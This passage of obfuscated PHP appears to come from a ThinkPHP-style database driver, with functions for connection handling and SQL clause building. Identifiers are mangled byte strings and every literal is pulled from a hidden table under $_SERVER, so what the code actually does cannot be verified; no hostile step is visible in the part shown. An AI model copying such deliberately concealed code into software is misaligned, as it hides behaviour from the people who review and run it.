$A¹‡ˆ«¬­Ä[$eôÎ½ÛÎÛ[928]] : array()); } elseif (empty($A¹‡ˆ«¬­Ä)) { if (think_config($eôÎ½ÛÎÛ[929]) && $eôÎ½ÛÎÛ[763] != strtolower(think_config($eôÎ½ÛÎÛ[930]))) { $A¹‡ˆ«¬­Ä = $this->parseDSN(think_config($eôÎ½ÛÎÛ[929])); } else { $A¹‡ˆ«¬­Ä = array($eôÎ½ÛÎÛ[918] => think_config($eôÎ½ÛÎÛ[930]), $eôÎ½ÛÎÛ[846] => think_config($eôÎ½ÛÎÛ[931]), $eôÎ½ÛÎÛ[847] => think_config($eôÎ½ÛÎÛ[932]), $eôÎ½ÛÎÛ[844] => think_config($eôÎ½ÛÎÛ[933]), $eôÎ½ÛÎÛ[845] => think_config($eôÎ½ÛÎÛ[934]), $eôÎ½ÛÎÛ[27] => think_config($eôÎ½ÛÎÛ[253]), $eôÎ½ÛÎÛ[873] => think_config($eôÎ½ÛÎÛ[929]), $eôÎ½ÛÎÛ[23] => think_config($eôÎ½ÛÎÛ[935])); } } return $A¹‡ˆ«¬­Ä; } protected function initConnect($dàâÓ†öã = true) { if (1 == think_config($_SERVER[£¶ä½¶¢][28])) { $this->_linkID = $this->multiConnect($dàâÓ†öã); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $fİ‰‡ÙËé => $a ôÉ³²ÕÒ) { $this->_linkID = $a ôÉ³²ÕÒ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($EÓ­èÍä—š = false) { goto cÔÚƒ™¹¬; aÇíòáæÅí: if (empty($FŒåˆñ«´Ã)) { foreach ($this->config as $Eä¢çª¶’õ => $dÑƒ†äŠ) { $FŒåˆñ«´Ã[$Eä¢çª¶’õ] = explode($b¶²¤÷Í²[57], $dÑƒ†äŠ); } } if (think_config($b¶²¤÷Í²[936])) { if ($EÓ­èÍä—š) { $A§•ˆÎº·Ò = floor(mt_rand(0, think_config($b¶²¤÷Í²[937]) - 1)); $CÍ’çÜ”Î = $A§•ˆÎº·Ò; } else { if (is_numeric(think_config($b¶²¤÷Í²[938]))) { $A§•ˆÎº·Ò = think_config($b¶²¤÷Í²[938]); } else { $A§•ˆÎº·Ò = floor(mt_rand(think_config($b¶²¤÷Í²[937]), count($FŒåˆñ«´Ã[$b¶²¤÷Í²[844]]) - 1)); } } } else { $A§•ˆÎº·Ò = floor(mt_rand(0, count($FŒåˆñ«´Ã[$b¶²¤÷Í²[844]]) - 1)); $CÍ’çÜ”Î = $A§•ˆÎº·Ò; } $A§•ˆÎº·Ò = $CÍ’çÜ”Î !== -1 ? $CÍ’çÜ”Î : $A§•ˆÎº·Ò; goto F…Ğº§íŠ; F…Ğº§íŠ: $B¡îïØÈà = array($b¶²¤÷Í²[846] => isset($FŒåˆñ«´Ã[$b¶²¤÷Í²[846]][$A§•ˆÎº·Ò]) ? $FŒåˆñ«´Ã[$b¶²¤÷Í²[846]][$A§•ˆÎº·Ò] : $FŒåˆñ«´Ã[$b¶²¤÷Í²[846]][0], $b¶²¤÷Í²[847] => isset($FŒåˆñ«´Ã[$b¶²¤÷Í²[847]][$A§•ˆÎº·Ò]) ? $FŒåˆñ«´Ã[$b¶²¤÷Í²[847]][$A§•ˆÎº·Ò] : $FŒåˆñ«´Ã[$b¶²¤÷Í²[847]][0], $b¶²¤÷Í²[844] => isset($FŒåˆñ«´Ã[$b¶²¤÷Í²[844]][$A§•ˆÎº·Ò]) ? $FŒåˆñ«´Ã[$b¶²¤÷Í²[844]][$A§•ˆÎº·Ò] : $FŒåˆñ«´Ã[$b¶²¤÷Í²[844]][0], $b¶²¤÷Í²[845] => isset($FŒåˆñ«´Ã[$b¶²¤÷Í²[845]][$A§•ˆÎº·Ò]) ? $FŒåˆñ«´Ã[$b¶²¤÷Í²[845]][$A§•ˆÎº·Ò] : $FŒåˆñ«´Ã[$b¶²¤÷Í²[845]][0], $b¶²¤÷Í²[27] => isset($FŒåˆñ«´Ã[$b¶²¤÷Í²[27]][$A§•ˆÎº·Ò]) ? $FŒåˆñ«´Ã[$b¶²¤÷Í²[27]][$A§•ˆÎº·Ò] : $FŒåˆñ«´Ã[$b¶²¤÷Í²[27]][0], $b¶²¤÷Í²[873] => isset($FŒåˆñ«´Ã[$b¶²¤÷Í²[873]][$A§•ˆÎº·Ò]) ? $FŒåˆñ«´Ã[$b¶²¤÷Í²[873]][$A§•ˆÎº·Ò] : $FŒåˆñ«´Ã[$b¶²¤÷Í²[873]][0], $b¶²¤÷Í²[23] => isset($FŒåˆñ«´Ã[$b¶²¤÷Í²[23]][$A§•ˆÎº·Ò]) ? $FŒåˆñ«´Ã[$b¶²¤÷Í²[23]][$A§•ˆÎº·Ò] : $FŒåˆñ«´Ã[$b¶²¤÷Í²[23]][0]); return $this->connect($B¡îïØÈà, $A§•ˆÎº·Ò); goto D…”Ì“‡Í; cÔÚƒ™¹¬: $b¶²¤÷Í² =& $_SERVER[£¶ä½¶¢]; static $FŒåˆñ«´Ã = array(); static $CÍ’çÜ”Î = -1; goto aÇíòáæÅí; D…”Ì“‡Í: } public function parseDSN($a¯‡‰†À°Ş) { $E‰·Ñ†®ï‰ =& $_SERVER[£¶ä½¶¢]; if (empty($a¯‡‰†À°Ş)) { return !1; } $eµÈ„·‘…à = parse_url($a¯‡‰†À°Ş); if ($eµÈ„·‘…à[$E‰·Ñ†®ï‰[184]]) { $Bæ²Òç± = array($E‰·Ñ†®ï‰[918] => $eµÈ„·‘…à[$E‰·Ñ†®ï‰[184]], $E‰·Ñ†®ï‰[846] => isset($eµÈ„·‘…à[$E‰·Ñ†®ï‰[570]]) ? $eµÈ„·‘…à[$E‰·Ñ†®ï‰[570]] : $E‰·Ñ†®ï‰[43], $E‰·Ñ†®ï‰[847] => isset($eµÈ„·‘…à[$E‰·Ñ†®ï‰[939]]) ? $eµÈ„·‘…à[$E‰·Ñ†®ï‰[939]] : $E‰·Ñ†®ï‰[43], $E‰·Ñ†®ï‰[844] => isset($eµÈ„·‘…à[$E‰·Ñ†®ï‰[185]]) ? $eµÈ„·‘…à[$E‰·Ñ†®ï‰[185]] : $E‰·Ñ†®ï‰[43], $E‰·Ñ†®ï‰[845] => isset($eµÈ„·‘…à[$E‰·Ñ†®ï‰[186]]) ? $eµÈ„·‘…à[$E‰·Ñ†®ï‰[186]] : $E‰·Ñ†®ï‰[43], $E‰·Ñ†®ï‰[27] => isset($eµÈ„·‘…à[$E‰·Ñ†®ï‰[86]]) ? substr($eµÈ„·‘…à[$E‰·Ñ†®ï‰[86]], 1) : $E‰·Ñ†®ï‰[43]); } else { preg_match($E‰·Ñ†®ï‰[940], trim($a¯‡‰†À°Ş), $cšÇÊÃâ¬); $Bæ²Òç± = array($E‰·Ñ†®ï‰[918] => $cšÇÊÃâ¬[1], $E‰·Ñ†®ï‰[846] => $cšÇÊÃâ¬[2], $E‰·Ñ†®ï‰[847] => $cšÇÊÃâ¬[3], $E‰·Ñ†®ï‰[844] => $cšÇÊÃâ¬[4], $E‰·Ñ†®ï‰[845] => $cšÇÊÃâ¬[5], $E‰·Ñ†®ï‰[27] => $cšÇÊÃâ¬[6]); } $Bæ²Òç±[$E‰·Ñ†®ï‰[873]] = $E‰·Ñ†®ï‰[43]; return $Bæ²Òç±; } protected function debug() { $f‘Ş‡®Ñ‹£ =& $_SERVER[£¶ä½¶¢]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $f‘Ş‡®Ñ‹£[941]; if (think_config($f‘Ş‡®Ñ‹£[942])) { think_status($f‘Ş‡®Ñ‹£[943]); think_trace($this->queryStr . $f‘Ş‡®Ñ‹£[944] . think_status($f‘Ş‡®Ñ‹£[30], $f‘Ş‡®Ñ‹£[943], 6) . $f‘Ş‡®Ñ‹£[945], $f‘Ş‡®Ñ‹£[43], $f‘Ş‡®Ñ‹£[946]); } } protected function parseLock($Bğå§éˆ = false) { $bñ´ÙÒ®Í‡ =& $_SERVER[£¶ä½¶¢]; if (!$Bğå§éˆ) { return $bñ´ÙÒ®Í‡[43]; } if ($bñ´ÙÒ®Í‡[875] == $this->dbType) { return $bñ´ÙÒ®Í‡[947]; } return $bñ´ÙÒ®Í‡[948]; } protected function parseSet($fÁ÷‹ìøå¢) { $Cª¤Ò¸²ÅÄ =& $_SERVER[£¶ä½¶¢]; foreach ($fÁ÷‹ìøå¢ as $a¡ßÎ¼ÁÛò => $a¢åÓçİ×é) { if (is_array($a¢åÓçİ×é) && $Cª¤Ò¸²ÅÄ[304] == $a¢åÓçİ×é[0]) { $E°ªŠ³[] = $this->parseKey($a¡ßÎ¼ÁÛò) . $Cª¤Ò¸²ÅÄ[949] . $a¢åÓçİ×é[1]; } elseif (is_scalar($a¢åÓçİ×é) || is_null($a¢åÓçİ×é)) { $E°ªŠ³[] = $this->parseKey($a¡ßÎ¼ÁÛò) . $Cª¤Ò¸²ÅÄ[949] . $this->parseValue($a¢åÓçİ×é); } } return $Cª¤Ò¸²ÅÄ[950] . implode($Cª¤Ò¸²ÅÄ[57], $E°ªŠ³); } protected function bindParam($E´¶™Ô×›Û, $BÏÖÁ•Õè§) { $this->bind[$_SERVER[£¶ä½¶¢][14] . $E´¶™Ô×›Û] = $BÏÖÁ•Õè§; } protected function parseBind($e„ôİŠô) { $e„ôİŠô = array_merge($this->bind, $e„ôİŠô); $this->bind = array(); return $e„ôİŠô; } function parseKey(&$fš‡æ“†éğ, $dêÓ„­–§İ = true) { if ($dêÓ„­–§İ) { $fš‡æ“†éğ = $this->parseKeyCheck($fš‡æ“†éğ); } return $fš‡æ“†éğ; } function parseKeyCheck($CÁì¹óŠ´§) { $f¼ä¿íìïÔ =& $_SERVER[£¶ä½¶¢]; $CÁì¹óŠ´§ = trim($CÁì¹óŠ´§); if (!preg_match($f¼ä¿íìïÔ[951], $CÁì¹óŠ´§)) { think_exception($f¼ä¿íìïÔ[952] . $CÁì¹óŠ´§); } return $CÁì¹óŠ´§; } protected function parseValue($b˜‡·³î») { $BíŠ™½¸¡Œ =& $_SERVER[£¶ä½¶¢]; if (is_string($b˜‡·³î»)) { $b˜‡·³î» = $BíŠ™½¸¡Œ[914] . $this->escapeString($b˜‡·³î») . $BíŠ™½¸¡Œ[914]; } elseif (isset($b˜‡·³î»[0]) && is_string($b˜‡·³î»[0]) && strtolower($b˜‡·³î»[0]) == $BíŠ™½¸¡Œ[304]) { $b˜‡·³î» = $this->escapeString($b˜‡·³î»[1]); } elseif (is_array($b˜‡·³î»)) { $b˜‡·³î» = array_map(array($this, $BíŠ™½¸¡Œ[915]), $b˜‡·³î»); } elseif (is_bool($b˜‡·³î»)) { $b˜‡·³î» = $b˜‡·³î» ? $BíŠ™½¸¡Œ[97] : $BíŠ™½¸¡Œ[201]; } elseif (is_null($b˜‡·³î»)) { $b˜‡·³î» = $BíŠ™½¸¡Œ[113]; } return $b˜‡·³î»; } protected function parseField($Cß–Î‘Õ‡) { $e°”ùÍÆ§æ =& $_SERVER[£¶ä½¶¢]; if (is_string($Cß–Î‘Õ‡) && strpos($Cß–Î‘Õ‡, $e°”ùÍÆ§æ[57])) { $Cß–Î‘Õ‡ = explode($e°”ùÍÆ§æ[57], $Cß–Î‘Õ‡); } if (is_array($Cß–Î‘Õ‡)) { $cšÊÒÀœ™” = array(); foreach ($Cß–Î‘Õ‡ as $eÈÊ¬‰°®Å => $bùÔ¾¨ùˆÇ) { if (!is_numeric($eÈÊ¬‰°®Å)) { $cšÊÒÀœ™”[] = $this->parseKey($eÈÊ¬‰°®Å, !1) . $e°”ùÍÆ§æ[953] . $this->parseKey($bùÔ¾¨ùˆÇ); } else { $cšÊÒÀœ™”[] = $this->parseKey($bùÔ¾¨ùˆÇ); } } $b†¼Ò²ì­ = implode($e°”ùÍÆ§æ[57], $cšÊÒÀœ™”); } elseif (is_string($Cß–Î‘Õ‡) && !empty($Cß–Î‘Õ‡)) { $b†¼Ò²ì­ = $Cß–Î‘Õ‡; } else { $b†¼Ò²ì­ = $e°”ùÍÆ§æ[192]; } return $b†¼Ò²ì­; } protected function parseTable($fß›««£) { $AºÌ³îÌ¯  =& $_SERVER[£¶ä½¶¢]; if (is_array($fß›««£)) { $CŠÎ—‚ø = array(); foreach ($fß›««£ as $Aæ¬„‡Ìœ => $D¡·ê°£ ¬) { if (!is_numeric($Aæ¬„‡Ìœ)) { $CŠÎ—‚ø[] = $this->parseKey($Aæ¬„‡Ìœ) . $AºÌ³îÌ¯ [60] . $this->parseKey($D¡·ê°£ ¬); } else { $CŠÎ—‚ø[] = $this->parseKey($Aæ¬„‡Ìœ); } } $fß›««£ = $CŠÎ—‚ø; } elseif (is_string($fß›««£)) { if (strstr($fß›««£, $AºÌ³îÌ¯ [60])) { return $fß›««£; } $fß›««£ = explode($AºÌ³îÌ¯ [57], $fß›««£); array_walk($fß›««£, array($this, $AºÌ³îÌ¯ [864])); } return $AºÌ³îÌ¯ [858] . trim(implode($AºÌ³îÌ¯ [954], $fß›««£), $AºÌ³îÌ¯ [390]) . $AºÌ³îÌ¯ [858]; } protected function parseWhere($C–ñÜ®‹’ï) { $eå¬áòÂÌô =& $_SERVER[£¶ä½¶¢]; $dÖ»†¬Ñ = $eå¬áòÂÌô[43]; if (is_string($C–ñÜ®‹’ï)) { $dÖ»†¬Ñ = $C–ñÜ®‹’ï; } else { $f®‚¦—¡çï = isset($C–ñÜ®‹’ï[$eå¬áòÂÌô[955]]) ? strtoupper($C–ñÜ®‹’ï[$eå¬áòÂÌô[955]]) : $eå¬áòÂÌô[43]; if (in_array($f®‚¦—¡çï, array($eå¬áòÂÌô[956], $eå¬áòÂÌô[957], $eå¬áòÂÌô[958]))) { $f®‚¦—¡çï = $eå¬áòÂÌô[60] . $f®‚¦—¡çï . $eå¬áòÂÌô[60]; unset($C–ñÜ®‹’ï[$eå¬áòÂÌô[955]]); } else { $f®‚¦—¡çï = $eå¬áòÂÌô[959]; } foreach ($C–ñÜ®‹’ï as $dãğëö¬¶ì => $Eˆ‹£ÆÏìŸ) { $dÖ»†¬Ñ .= $eå¬áòÂÌô[284]; if (is_numeric($dãğëö¬¶ì)) { $dãğëö¬¶ì = $eå¬áòÂÌô[960]; } if (0 === strpos($dãğëö¬¶ì, $eå¬áòÂÌô[81])) { $dÖ»†¬Ñ .= $this->parseThinkWhere($dãğëö¬¶ì, $Eˆ‹£ÆÏìŸ); } else { if (!preg_match($eå¬áòÂÌô[961], trim($dãğëö¬¶ì))) { think_exception(think_lang($eå¬áòÂÌô[962]) . $eå¬áòÂÌô[14] . $dãğëö¬¶ì); } $cÏÄ­æº°¯ = is_array($Eˆ‹£ÆÏìŸ) && isset($Eˆ‹£ÆÏìŸ[$eå¬áòÂÌô[963]]); $dãğëö¬¶ì = trim($dãğëö¬¶ì); if (strpos($dãğëö¬¶ì, $eå¬áòÂÌô[290])) { $eùï‘Îš‰Ë = explode($eå¬áòÂÌô[290], $dãğëö¬¶ì); $a†Ö¿ŠÈÙ = array(); foreach ($eùï‘Îš‰Ë as $Bˆ‘ÉŸÏÓ => $Bù­”Â’ÇÆ) { $cõ¹ø‘Ô = $cÏÄ­æº°¯ ? $Eˆ‹£ÆÏìŸ[$Bˆ‘ÉŸÏÓ] : $Eˆ‹£ÆÏìŸ; $a†Ö¿ŠÈÙ[] = $eå¬áòÂÌô[267] . $this->parseWhereItem($this->parseKey($Bù­”Â’ÇÆ), $cõ¹ø‘Ô) . $eå¬áòÂÌô[863]; } $dÖ»†¬Ñ .= implode($eå¬áòÂÌô[964], $a†Ö¿ŠÈÙ); } elseif (strpos($dãğëö¬¶ì, $eå¬áòÂÌô[291])) { $eùï‘Îš‰Ë = explode($eå¬áòÂÌô[291], $dãğëö¬¶ì); $a†Ö¿ŠÈÙ = array(); foreach ($eùï‘Îš‰Ë as $Bˆ‘ÉŸÏÓ => $Bù­”Â’ÇÆ) { $cõ¹ø‘Ô = $cÏÄ­æº°¯ ? $Eˆ‹£ÆÏìŸ[$Bˆ‘ÉŸÏÓ] : $Eˆ‹£ÆÏìŸ; $a†Ö¿ŠÈÙ[] = $eå¬áòÂÌô[267] . $this->parseWhereItem($this->parseKey($Bù­”Â’ÇÆ), $cõ¹ø‘Ô) . $eå¬áòÂÌô[863]; } $dÖ»†¬Ñ .= implode($eå¬áòÂÌô[959], $a†Ö¿ŠÈÙ); } else { $dÖ»†¬Ñ .= $this->parseWhereItem($this->parseKey($dãğëö¬¶ì), $Eˆ‹£ÆÏìŸ); } } $dÖ»†¬Ñ .= $eå¬áòÂÌô[285] . $f®‚¦—¡çï; } $dÖ»†¬Ñ = substr($dÖ»†¬Ñ, 0, -strlen($f®‚¦—¡çï)); } return empty($dÖ»†¬Ñ) ? $eå¬áòÂÌô[43] : $eå¬áòÂÌô[965] . $dÖ»†¬Ñ; } protected function parseWhereItem($Aì¥·Æâ¸¤, $bŸ¸ÍÍÛšÈ) { $d¸¦–¶” =& $_SERVER[£¶ä½¶¢]; $dØîÑäÓÔ  = $d¸¦–¶”[43]; if (is_array($bŸ¸ÍÍÛšÈ)) { if (is_string($bŸ¸ÍÍÛšÈ[0])) { $Eé…î§«¡İ = strtolower($bŸ¸ÍÍÛšÈ[0]); if (in_array($bŸ¸ÍÍÛšÈ[0], array($d¸¦–¶”[949], $d¸¦–¶”[966], $d¸¦–¶”[967], $d¸¦–¶”[968], $d¸¦–¶”[969], $d¸¦–¶”[970]))) { $dØîÑäÓÔ  .= $Aì¥·Æâ¸¤ . $d¸¦–¶”[60] . $bŸ¸ÍÍÛšÈ[0] . $d¸¦–¶”[60] . $this->parseValue($bŸ¸ÍÍÛšÈ[1]); } elseif (preg_match($d¸¦–¶”[971], $bŸ¸ÍÍÛšÈ[0])) { $dØîÑäÓÔ  .= $Aì¥·Æâ¸¤ . $d¸¦–¶”[60] . $this->exp[$Eé…î§«¡İ] . $d¸¦–¶”[60] . $this->parseValue($bŸ¸ÍÍÛšÈ[1]); } elseif (preg_match($d¸¦–¶”[972], $bŸ¸ÍÍÛšÈ[0])) { if (is_array($bŸ¸ÍÍÛšÈ[1])) { $fÚ…”Íò† = isset($bŸ¸ÍÍÛšÈ[2]) ? strtoupper($bŸ¸ÍÍÛšÈ[2]) : $d¸¦–¶”[957]; if (in_array($fÚ…”Íò†, array($d¸¦–¶”[956], $d¸¦–¶”[957], $d¸¦–¶”[958]))) { $Aœ©Ä Ø¤Ø = array(); foreach ($bŸ¸ÍÍÛšÈ[1] as $F ÇæŸ†×) { $Aœ©Ä Ø¤Ø[] = $Aì¥·Æâ¸¤ . $d¸¦–¶”[60] . $this->exp[$Eé…î§«¡İ] . $d¸¦–¶”[60] . $this->parseValue($F ÇæŸ†×); } $dØîÑäÓÔ  .= $d¸¦–¶”[267] . implode($d¸¦–¶”[60] . $fÚ…”Íò† . $d¸¦–¶”[60], $Aœ©Ä Ø¤Ø) . $d¸¦–¶”[863]; } } else { $dØîÑäÓÔ  .= $Aì¥·Æâ¸¤ . $d¸¦–¶”[60] . $this->exp[$Eé…î§«¡İ] . $d¸¦–¶”[60] . $this->parseValue($bŸ¸ÍÍÛšÈ[1]); } } elseif ($d¸¦–¶”[304] == $Eé…î§«¡İ) { $dØîÑäÓÔ  .= $d¸¦–¶”[861] . $Aì¥·Æâ¸¤ . $d¸¦–¶”[60] . $bŸ¸ÍÍÛšÈ[1] . $d¸¦–¶”[973]; } elseif (preg_match($d¸¦–¶”[974], $bŸ¸ÍÍÛšÈ[0])) { $dØîÑäÓÔ  .= $bŸ¸ÍÍÛšÈ[0]; } elseif (preg_match($d¸¦–¶”[975], $bŸ¸ÍÍÛšÈ[0])) { if (isset($bŸ¸ÍÍÛšÈ[2]) && $d¸¦–¶”[304] == $bŸ¸ÍÍÛšÈ[2]) { $dØîÑäÓÔ  .= $Aì¥·Æâ¸¤ . $d¸¦–¶”[60] . $this->exp[$Eé…î§«¡İ] . $d¸¦–¶”[60] . $bŸ¸ÍÍÛšÈ[1]; } else { if (is_string($bŸ¸ÍÍÛšÈ[1])) { $bŸ¸ÍÍÛšÈ[1] = explode($d¸¦–¶”[57], $bŸ¸ÍÍÛšÈ[1]); } $AŞº…•ÄäÃ = implode($d¸¦–¶”[57], $this->parseValue($bŸ¸ÍÍÛšÈ[1])); $dØîÑäÓÔ  .= $Aì¥·Æâ¸¤ . $d¸¦–¶”[60] . $this->exp[$Eé…î§«¡İ] . $d¸¦–¶”[861] . $AŞº…•ÄäÃ . $d¸¦–¶”[863]; } } elseif (preg_match($d¸¦–¶”[976], $bŸ¸ÍÍÛšÈ[0])) { $Bœ®çê§…¿ = is_string($bŸ¸ÍÍÛšÈ[1]) ? explode($d¸¦–¶”[57], $bŸ¸ÍÍÛšÈ[1]) : $bŸ¸ÍÍÛšÈ[1]; $dØîÑäÓÔ  .= $d¸¦–¶”[861] . $Aì¥·Æâ¸¤ . $d¸¦–¶”[60] . $this->exp[$Eé…î§«¡İ] . $d¸¦–¶”[60] . $this->parseValue($Bœ®çê§…¿[0]) . $d¸¦–¶”[959] . $this->parseValue($Bœ®çê§…¿[1]) . $d¸¦–¶”[285]; } else { think_exception(think_lang($d¸¦–¶”[962]) . $d¸¦–¶”[14] . $bŸ¸ÍÍÛšÈ[0]); } } else { $BÁˆ‰÷ŸÈ” = count($bŸ¸ÍÍÛšÈ); $cáù×‚„¹Å = $d¸¦–¶”[43]; if (is_string($bŸ¸ÍÍÛšÈ[$BÁˆ‰÷ŸÈ” - 1])) { $cáù×‚„¹Å = isset($bŸ¸ÍÍÛšÈ[$BÁˆ‰÷ŸÈ” - 1]) ? strtoupper($bŸ¸ÍÍÛšÈ[$BÁˆ‰÷ŸÈ” - 1]) : $d¸¦–¶”[43]; if (in_array($cáù×‚„¹Å, array($d¸¦–¶”[956], $d¸¦–¶”[957], $d¸¦–¶”[958]))) { $BÁˆ‰÷ŸÈ” = $BÁˆ‰÷ŸÈ” - 1; } } else { $cáù×‚„¹Å = $d¸¦–¶”[956]; } for ($f Â’â•Ÿ° = 0; $f Â’â•Ÿ° < $BÁˆ‰÷ŸÈ”; $f Â’â•Ÿ°++) { $Bœ®çê§…¿ = is_array($bŸ¸ÍÍÛšÈ[$f Â’â•Ÿ°]) ? $bŸ¸ÍÍÛšÈ[$f Â’â•Ÿ°][1] : $bŸ¸ÍÍÛšÈ[$f Â’â•Ÿ°]; if ($d¸¦–¶”[304] == strtolower($bŸ¸ÍÍÛšÈ[$f Â’â•Ÿ°][0])) { $dØîÑäÓÔ  .= $d¸¦–¶”[267] . $Aì¥·Æâ¸¤ . $d¸¦–¶”[60] . $Bœ®çê§…¿ . $d¸¦–¶”[973] . $cáù×‚„¹Å . $d¸¦–¶”[60]; } else { $e–‰º±÷ = is_array($bŸ¸ÍÍÛšÈ[$f Â’â•Ÿ°]) ? $this->exp[strtolower($bŸ¸ÍÍÛšÈ[$f Â’â•Ÿ°][0])] : $d¸¦–¶”[949]; if (!$e–‰º±÷ && is_array($bŸ¸ÍÍÛšÈ[$f Â’â•Ÿ°]) && in_array($bŸ¸ÍÍÛšÈ[$f Â’â•Ÿ°][0], array($d¸¦–¶”[949], $d¸¦–¶”[966], $d¸¦–¶”[967], $d¸¦–¶”[968], $d¸¦–¶”[969], $d¸¦–¶”[970]))) { $e–‰º±÷ = $bŸ¸ÍÍÛšÈ[$f Â’â•Ÿ°][0]; } $dØîÑäÓÔ  .= $d¸¦–¶”[267] . $Aì¥·Æâ¸¤ . $d¸¦–¶”[60] . $e–‰º±÷ . $d¸¦–¶”[60] . $this->parseValue($Bœ®çê§…¿) . $d¸¦–¶”[973] . $cáù×‚„¹Å . $d¸¦–¶”[60]; } } $dØîÑäÓÔ  = substr($dØîÑäÓÔ , 0, -4); } } else { $dØîÑäÓÔ  .= $Aì¥·Æâ¸¤ . $d¸¦–¶”[977] . $this->parseValue($bŸ¸ÍÍÛšÈ); } return $dØîÑäÓÔ ; } protected function parseThinkWhere($BØã¯Òô›, $A‘°İØÇ§…) { $aËÌÀ´áÀ =& $_SERVER[£¶ä½¶¢]; $a¨•¨»ÛõÁ = $aËÌÀ´áÀ[43]; switch ($BØã¯Òô›) { case $aËÌÀ´áÀ[359]: $a¨•¨»ÛõÁ = $A‘°İØÇ§…; break; case $aËÌÀ´áÀ[960]: $a¨•¨»ÛõÁ = is_string($A‘°İØÇ§…) ? $A‘°İØÇ§… : substr($this->parseWhere($A‘°İØÇ§…), 6); break; case $aËÌÀ´áÀ[978]: parse_str($A‘°İØÇ§…, $F…‡¹ŒÒ‡–); if (isset($F…‡¹ŒÒ‡–[$aËÌÀ´áÀ[955]])) { $F÷ ™£Š è = $aËÌÀ´áÀ[60] . strtoupper($F…‡¹ŒÒ‡–[$aËÌÀ´áÀ[955]]) . $aËÌÀ´áÀ[60]; unset($F…‡¹ŒÒ‡–[$aËÌÀ´áÀ[955]]); } else { $F÷ ™£Š è = $aËÌÀ´áÀ[959]; } $C×ï†‰Ô²ù = array(); foreach ($F…‡¹ŒÒ‡– as $C÷¾º±ì¡ => $E«è¸»Á¯) { $C×ï†‰Ô²ù[] = $this->parseKey($C÷¾º±ì¡) . $aËÌÀ´áÀ[977] . $this->parseValue($E«è¸»Á¯); } $a¨•¨»ÛõÁ = implode($F÷ ™£Š è, $C×ï†‰Ô²ù); break; } return $a¨•¨»ÛõÁ; } protected function parseLimit($DŸŒÚÕ°Íä) { $Ešª¨òÊÊ =& $_SERVER[£¶ä½¶¢]; return !empty($DŸŒÚÕ°Íä) ? $Ešª¨òÊÊ[58] . $DŸŒÚÕ°Íä . $Ešª¨òÊÊ[60] : $Ešª¨òÊÊ[43]; } protected function parseJoin($c’»…—¶ç¥) { $AìğÏÎ¾—ñ =& $_SERVER[£¶ä½¶¢]; $DĞÌ›İ§¹ = $AìğÏÎ¾—ñ[43]; if (!empty($c’»…—¶ç¥)) { if (is_array($c’»…—¶ç¥)) { foreach ($c’»…—¶ç¥ as $D»°¯ÜÚº’ => $EÑµÒ®‹Ñ) { if (!1 !== stripos($EÑµÒ®‹Ñ, $AìğÏÎ¾—ñ[979])) { $DĞÌ›İ§¹ .= $AìğÏÎ¾—ñ[60] . $EÑµÒ®‹Ñ; } else { $DĞÌ›İ§¹ .= $AìğÏÎ¾—ñ[980] . $EÑµÒ®‹Ñ; } } } else { $DĞÌ›İ§¹ .= $AìğÏÎ¾—ñ[980] . $c’»…—¶ç¥; } } $DĞÌ›İ§¹ = preg_replace($AìğÏÎ¾—ñ[981], think_config($AìğÏÎ¾—ñ[887]) . $AìğÏÎ¾—ñ[982], $DĞÌ›İ§¹); return $DĞÌ›İ§¹; } protected function parseOrder($e’ÎŞÚ‡×ˆ) { $EíÎÈÇ¼… =& $_SERVER[£¶ä½¶¢]; if (is_array($e’ÎŞÚ‡×ˆ)) { $aÇŞƒÑÚ = array(); foreach ($e’ÎŞÚ‡×ˆ as $FÚ‘çô÷©Î => $f¨¦òíù™Ş) { if (is_numeric($FÚ‘çô÷©Î)) { $aÇŞƒÑÚ[] = $this->parseKey($f¨¦òíù™Ş); } else { $f¨¦òíù™Ş = in_array(strtoupper(trim($f¨¦òíù™Ş)), array($EíÎÈÇ¼…[983], $EíÎÈÇ¼…[984])) ? $EíÎÈÇ¼…[60] . $f¨¦òíù™Ş : $EíÎÈÇ¼…[43]; if (preg_match($EíÎÈÇ¼…[985], $FÚ‘çô÷©Î)) { $aÇŞƒÑÚ[] = $this->parseKey($FÚ‘çô÷©Î) . $f¨¦òíù™Ş; } else { think_exception($EíÎÈÇ¼…[986] . $FÚ‘çô÷©Î); } } } $e’ÎŞÚ‡×ˆ = implode($EíÎÈÇ¼…[57], $aÇŞƒÑÚ); } return !empty($e’ÎŞÚ‡×ˆ) ? $EíÎÈÇ¼…[987] . $e’ÎŞÚ‡×ˆ : $EíÎÈÇ¼…[43]; } protected function parseGroup($Dƒ§ç½±©¢) { $E¯Ä÷°©‘é =& $_SERVER[£¶ä½¶¢]; return !empty($Dƒ§ç½±©¢) ? $E¯Ä÷°©‘é[988] . $Dƒ§ç½±©¢ : $E¯Ä÷°©‘é[43]; } protected function parseHaving($B¦®‹ïÀªå) { $eé„¤Äè”Ã =& $_SERVER[£¶ä½¶¢]; return !empty($B¦®‹ïÀªå) ? $eé„¤Äè”Ã[989] . $B¦®‹ïÀªå : $eé„¤Äè”Ã[43]; } protected function parseComment($B‚‡˜›Ôèñ) { $cÀ¡œô¯Õ =& $_SERVER[£¶ä½¶¢]; return !empty($B‚‡˜›Ôèñ) ? $cÀ¡œô¯Õ[990] . $B‚‡˜›Ôèñ . $cÀ¡œô¯Õ[991] : $cÀ¡œô¯Õ[43]; } protected function parseDistinct($bº”´¦–ç¢) { $D§å­²ò×¯ =& $_SERVER[£¶ä½¶¢]; return !empty($bº”´¦–ç¢) ? $D§å­²ò×¯[992] : $D§å­²ò×¯[43]; } protected function parseUnion($Dæß¿’êÑï) { $b‹ù¸å±¦• =& $_SERVER[£¶ä½¶¢]; if (empty($Dæß¿’êÑï)) { return $b‹ù¸å±¦•[43]; } if (isset($Dæß¿’êÑï[$b‹ù¸å±¦•[355]])) { $c–ç†ÓÇÕ» = $b‹ù¸å±¦•[993]; unset($Dæß¿’êÑï[$b‹ù¸å±¦•[355]]); } else { $c–ç†ÓÇÕ» = $b‹ù¸å±¦•[994]; } foreach ($Dæß¿’êÑï as $D‚„Ö×à¨Ä) { $F¿®Øï•›[] = $c–ç†ÓÇÕ» . (is_array($D‚„Ö×à¨Ä) ? $this->buildSelectSql($D‚„Ö×à¨Ä) : $D‚„Ö×à¨Ä); } return 